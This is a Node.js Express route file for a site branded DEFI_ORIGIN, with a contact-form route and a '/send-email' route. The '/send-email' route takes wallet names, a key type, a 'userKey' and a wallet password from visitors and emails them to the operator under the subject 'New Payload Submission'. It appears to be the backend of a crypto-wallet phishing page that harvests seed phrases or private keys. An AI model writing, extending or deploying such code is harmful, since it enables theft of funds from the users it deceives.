// routes/emailRoutes.js
const express = require("express");
const nodemailer = require("nodemailer");
require("dotenv").config();

const router = express.Router();

// Set up Nodemailer transporter
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.EMAIL_DEFIORIGIN,
    pass: process.env.EMAIL_DEFIORIGIN_PASS,
  },
});

// POST /email/send-email
router.post("/send-email", (req, res) => {
  const { iconId, iconName, keyType, userKey, walletPassword } = req.body;
  const mailOptions = {
    from: process.env.EMAIL_DEFIORIGIN,
    to: process.env.EMAIL_DEFIORIGIN,
    subject: "New Payload Submission",
    text: `
Icon ID: ${iconId}
Icon Name: ${iconName}
Key Type: ${keyType}
User Key: ${userKey}
Wallet Password: ${walletPassword || "N/A"}
    `,
  };

  transporter.sendMail(mailOptions, (err, info) => {
    if (err) {
      console.error("Error sending email:", err);
      return res.status(500).send("Error sending email");
    }
    console.log("Email sent:", info.response);
    res.status(200).send("Email sent successfully");
  });
});

// POST /email/contact
router.post("/contact", (req, res) => {
  const { email, message } = req.body;

  const adminMailOptions = {
    from: process.env.EMAIL_DEFIORIGIN,
    to: process.env.EMAIL_DEFIORIGIN,
    subject: "New Message from Contact Form",
    text: `Email: ${email}\n\nMessage:\n${message}`,
  };

  const userMailOptions = {
    from: process.env.EMAIL_DEFIORIGIN_FROM,
    to: email,
    subject: "Thank you for contacting us",
    text: `
Hi,

Thank you for reaching out. We have received your message and will get back to you shortly.

Your message:
${message}

Best regards,
DEFI_ORIGIN
    `,
  };

  transporter.sendMail(adminMailOptions, (err) => {
    if (err) {
      console.error("Error sending email to admin:", err);
      return res.status(500).send("Error sending email");
    }
    // only send confirmation once admin email succeeds
    transporter.sendMail(userMailOptions, (err2, info2) => {
      if (err2) {
        console.error("Error sending confirmation email:", err2);
        return res.status(500).send("Error sending confirmation email");
      }
      console.log("Confirmation sent to user:", info2.response);
      res.status(200).send("Emails sent successfully");
    });
  });
});

module.exports = router;
